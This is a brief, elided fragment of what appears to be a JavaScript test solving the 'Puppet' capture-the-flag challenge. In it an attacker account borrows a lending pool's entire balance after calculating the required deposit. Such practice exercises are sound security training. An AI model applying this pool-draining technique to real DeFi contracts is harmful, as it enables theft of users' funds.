...
describe('[Challenge] Puppet', function () {
	...
	let requiredDeposit = await this.lendingPool.calculateDepositRequired(poolBalance);
	await this.lendingPool.connect(attacker).borrow(poolBalance, {value: requiredDeposit});
